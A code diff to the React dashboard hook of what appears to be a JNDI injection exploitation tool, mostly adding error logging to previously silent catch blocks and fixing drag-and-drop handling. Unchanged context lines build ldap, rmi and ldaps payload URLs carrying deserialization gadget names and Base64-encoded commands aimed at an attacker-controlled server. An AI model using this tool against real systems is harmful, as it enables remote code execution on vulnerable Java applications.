@@ -103,7 +103,9 @@ export default function useDashboard() {
     try {
       const res = await getGadgets()
       setGadgets(res.data)
-    } catch (e) { /* ignore */ }
+    } catch (e) {
+      console.error('Failed to load gadgets:', e)
+    }
   }
 
   async function handleToggleServer(server) {
@@ -113,8 +115,9 @@ export default function useDashboard() {
       if (res.data.success) {
         setStatus(res.data.status)
       }
-    } catch (e) { /* ignore */ }
-    finally { setToggling(null) }
+    } catch (e) {
+      console.error('Failed to toggle server:', e)
+    } finally { setToggling(null) }
   }
 
   async function handleSaveConfig() {
@@ -122,8 +125,9 @@ export default function useDashboard() {
     try {
       await updateConfig(configForm)
       loadStatus()
-    } catch (e) { /* ignore */ }
-    finally { setLoading(false) }
+    } catch (e) {
+      console.error('Failed to save config:', e)
+    } finally { setLoading(false) }
   }
 
   async function handleGeneratePayload() {
@@ -162,8 +166,9 @@ export default function useDashboard() {
       setJndiPayloadResult(`ldap://${ipAddr}:${ldapPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
       setRmiPayloadResult(`rmi://${ipAddr}:${rmiPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
       setLdapsPayloadResult(`ldaps://${ipAddr}:${ldapsPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
-    } catch (e) { /* ignore */ }
-    finally { setLoading(false) }
+    } catch (e) {
+      console.error('Failed to generate JNDI payload:', e)
+    } finally { setLoading(false) }
   }
 
   function handleGenerateClassLoader() {
@@ -187,8 +192,9 @@ export default function useDashboard() {
       setClassLoaderResult(`ldap://${ipAddr}:${ldapPort}/${route}/M-LF-${fp}`)
       setRmiClassLoaderResult(`rmi://${ipAddr}:${rmiPort}/${route}/M-LF-${fp}`)
       setLdapsClassLoaderResult(`ldaps://${ipAddr}:${ldapsPort}/${route}/M-LF-${fp}`)
-    } catch (e) { /* ignore */ }
-    finally { setLoading(false) }
+    } catch (e) {
+      console.error('Failed to generate ClassLoader payload:', e)
+    } finally { setLoading(false) }
   }
 
   function logout() {
@@ -201,8 +207,9 @@ export default function useDashboard() {
     try {
       const res = await getLogs(100)
       setLogLines(res.data.logs || [])
-    } catch { /* ignore */ }
-    finally { setLogLoading(false) }
+    } catch (e) {
+      console.error('Failed to fetch logs:', e)
+    } finally { setLogLoading(false) }
   }
 
   useEffect(() => { loadStatus(); loadGadgets() }, [])
@@ -217,8 +224,9 @@ export default function useDashboard() {
     try {
       const res = await getFiles()
       setFiles(res.data)
-    } catch { /* ignore */ }
-    finally { setFilesLoading(false) }
+    } catch (e) {
+      console.error('Failed to fetch files:', e)
+    } finally { setFilesLoading(false) }
   }
 
   async function handleDownloadFile(name) {
@@ -230,7 +238,9 @@ export default function useDashboard() {
       a.download = name
       a.click()
       window.URL.revokeObjectURL(url)
-    } catch { /* ignore */ }
+    } catch (e) {
+      console.error('Failed to download file:', e)
+    }
   }
 
   async function handleDeleteFile(name) {
@@ -238,7 +248,9 @@ export default function useDashboard() {
     try {
       await apiDeleteFile(name)
       fetchFiles()
-    } catch { /* ignore */ }
+    } catch (e) {
+      console.error('Failed to delete file:', e)
+    }
   }
 
   function handleDragOver(e) {
@@ -250,7 +262,12 @@ export default function useDashboard() {
   function handleDragLeave(e) {
     e.preventDefault()
     e.stopPropagation()
-    setDragOver(false)
+    const rect = e.currentTarget.getBoundingClientRect()
+    const x = e.clientX
+    const y = e.clientY
+    if (x < rect.left || x > rect.right || y < rect.top || y > rect.bottom) {
+      setDragOver(false)
+    }
   }
 
   function handleDrop(e) {
@@ -280,8 +297,9 @@ export default function useDashboard() {
       if (res.data.success) {
         fetchFiles()
       }
-    } catch (e) { /* ignore */ }
-    finally {
+    } catch (e) {
+      console.error('Failed to upload file:', e)
+    } finally {
       setUploading(false)
     }
   }
